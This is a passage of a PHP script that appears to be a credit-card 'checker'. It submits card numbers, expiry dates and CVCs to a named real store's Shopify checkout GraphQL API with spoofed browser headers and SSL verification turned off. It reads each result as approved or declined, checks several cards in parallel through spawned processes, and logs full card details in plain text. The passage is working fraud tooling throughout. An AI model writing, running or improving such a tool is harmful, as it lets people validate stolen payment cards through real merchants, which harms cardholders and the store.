                'requestUrl' => 'https://www.vanguardmil.com/checkouts/cn/hWN1DD0iR9Rfnqmheh7rVKMb?cart_link_id=LT5dG7f5',
                'pageId' => '5a2703f8-ACE1-4B21-3F97-0BECB1D8D8C1'
            ]
        ],
        'operationName' => 'SubmitForCompletion'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    if ($curl_error || $http_code !== 200) {
        log_message("Submit for completion failed: HTTP $http_code, Error: $curl_error, Response: " . substr($response, 0, 200));
        return false;
    }
    
    $result = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE || !isset($result['data']['submitForCompletion'])) {
        log_message("Invalid submit for completion response: " . substr($response, 0, 200));
        return false;
    }
    
    $submitResult = $result['data']['submitForCompletion'];
    if (isset($submitResult['__typename']) && $submitResult['__typename'] === 'SubmitSuccess') {
        return $submitResult['receipt']['id'];
    }
    
    return false;
}

// Function to poll for receipt
function pollForReceipt($receipt_id, $session_token) {
    $url = 'https://www.vanguardmil.com/checkouts/unstable/graphql?operationName=PollForReceipt';
    
    $headers = [
        'accept: application/json',
        'accept-language: en-US',
        'content-type: application/json',
        'origin: https://www.vanguardmil.com',
        'priority: u=1, i',
        'referer: https://www.vanguardmil.com/',
        'sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'shopify-checkout-client: checkout-web/1.0',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'x-checkout-one-session-token: ' . $session_token,
        'x-checkout-web-build-id: 1425498c9f082684649666eafda564f07561d25c',
        'x-checkout-web-deploy-stage: production',
        'x-checkout-web-server-handling: fast',
        'x-checkout-web-server-rendering: yes',
        'x-checkout-web-source-id: hWN1DD0iR9Rfnqmheh7rVKMb'
    ];
    
    $data = [
        'query' => 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}parentRelationship{parent{stableId lineAllocations{stableId __typename}__typename}__typename}__typename}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
        'variables' => [
            'receiptId' => $receipt_id,
            'sessionToken' => $session_token
        ],
        'operationName' => 'PollForReceipt'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    if ($curl_error || $http_code !== 200) {
        log_message("Poll for receipt failed: HTTP $http_code, Error: $curl_error, Response: " . substr($response, 0, 200));
        return false;
    }
    
    $result = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        log_message("Invalid poll for receipt response: " . substr($response, 0, 200));
        return false;
    }
    
    return $result;
}

// Function to check multiple cards in parallel using multi-curl
function checkCardsParallel($cards, $max_concurrent = 3) {
    if (empty($cards) || !is_array($cards)) {
        return "DECLINED [No cards provided for parallel check]";
    }

    $mh = curl_multi_init();
    $chs = [];
    $results = [];
    $processed = 0;

    // Initialize curl handles for up to $max_concurrent cards
    foreach ($cards as $index => $card) {
        if ($processed >= $max_concurrent) {
            break;
        }

        $card_number = preg_replace('/[^0-9]/', '', $card['number'] ?? '');
        $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month'] ?? '');
        $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year'] ?? '');
        $cvc = preg_replace('/[^0-9]/', '', $card['cvc'] ?? '');

        // Normalize exp_month
        $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);

        // Normalize exp_year to 4 digits (supports both YY and YYYY)
        if (strlen($exp_year_raw) == 2) {
            $current_year = (int) date('y');
            $current_century = (int) (date('Y') - $current_year);
            $card_year = (int) $exp_year_raw;
            $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
        } elseif (strlen($exp_year_raw) == 4) {
            $exp_year = (int) $exp_year_raw;
        } else {
            $exp_year = (int) date('Y') + 1; // Default fallback
        }

        $card_details = "$card_number|$exp_month|$exp_year|$cvc";
        log_message("Added parallel check for card $index: $card_details");

        // Create a temporary file to store the result
        $temp_file = tempnam(sys_get_temp_dir(), 'shopify_result_');
        $temp_files[$index] = $temp_file;

        // Prepare the command to run the checkCard function
        $command = sprintf(
            'php -r "require_once \'%s\'; echo checkCard(\'%s\', \'%s\', \'%s\', \'%s\');" > %s 2>&1',
            __FILE__,
            $card_number,
            $exp_month,
            $exp_year,
            $cvc,
            $temp_file
        );

        // Start the process
        $process = proc_open($command, [], $pipes);
        if (is_resource($process)) {
            // Close all pipes
            foreach ($pipes as $pipe) {
                fclose($pipe);
            }
            $processes[$index] = $process;
            $processed++;
        }
    }

    // Wait for all processes to complete
    foreach ($processes as $index => $process) {
        $status = proc_get_status($process);
        while ($status['running']) {
            sleep(1);
            $status = proc_get_status($process);
        }
        proc_close($process);

        // Read the result from the temp file
        $temp_file = $temp_files[$index];
        if (file_exists($temp_file)) {
            $results[$index] = trim(file_get_contents($temp_file));
            unlink($temp_file);
        } else {
            $results[$index] = "DECLINED [Parallel processing error]";
        }
    }

    // Return combined results
    return implode("\n", $results);
}

// Check if the request is POST and contains card data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card'])) {
    log_message("Invalid request or missing card data");
    echo "DECLINED [Invalid request or missing card data]";
    exit;
}

// Handle single card or multiple cards
if (is_array($_POST['card']) && isset($_POST['card']['number'])) {
    // Single card
    $card = $_POST['card'];
    $required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];

    // Validate card data
    foreach ($required_fields as $field) {
        if (empty($card[$field])) {
            log_message("Missing $field");
            echo "DECLINED [Missing $field]";
            exit;
        }
    }

    // Sanitize inputs
    $card_number = preg_replace('/[^0-9]/', '', $card['number']);
    $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
    $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
    $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);

    // Normalize exp_month to 2 digits
    $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
    if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
        log_message("Invalid exp_month format: $exp_month_raw");
        echo "DECLINED [Invalid exp_month format]";
        exit;
    }

    // Normalize exp_year to 4 digits (full support for YY or YYYY)
    if (strlen($exp_year_raw) == 2) {
        $current_year = (int) date('y');
        $current_century = (int) (date('Y') - $current_year);
        $card_year = (int) $exp_year_raw;
        $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
    } elseif (strlen($exp_year_raw) == 4) {
        $exp_year = (int) $exp_year_raw;
    } else {
        log_message("Invalid exp_year format: $exp_year_raw");
        echo "DECLINED [Invalid exp_year format - must be YY or YYYY]";
        exit;
    }

    // Validate card number, year, and CVC
    if (!preg_match('/^\d{13,19}$/', $card_number)) {
        log_message("Invalid card number format: $card_number");
        echo "DECLINED [Invalid card number format]";
        exit;
    }
    if (!preg_match('/^\d{4}$/', (string) $exp_year) || $exp_year > (int) date('Y') + 10) {
        log_message("Invalid exp_year after normalization: $exp_year");
        echo "DECLINED [Invalid exp_year format or too far in future]";
        exit;
    }
    if (!preg_match('/^\d{3,4}$/', $cvc)) {
        log_message("Invalid CVC format: $cvc");
        echo "DECLINED [Invalid CVC format]";
        exit;
    }

    // Validate logical expiry
    $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
    $current_timestamp = strtotime('first day of this month');
    if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
        log_message("Card expired: $card_number|$exp_month|$exp_year|$cvc");
        echo "DECLINED [Card expired] $card_number|$exp_month|$exp_year|$cvc";
        exit;
    }

    // Check single card
    echo checkCard($card_number, $exp_month, $exp_year, $cvc);
} elseif (is_array($_POST['card']) && count($_POST['card']) > 1) {
    // Multiple cards - process in parallel (3 at a time)
    echo checkCardsParallel($_POST['card'], 3);
} else {
    log_message("Invalid card data format");
    echo "DECLINED [Invalid card data format]";
}
?>
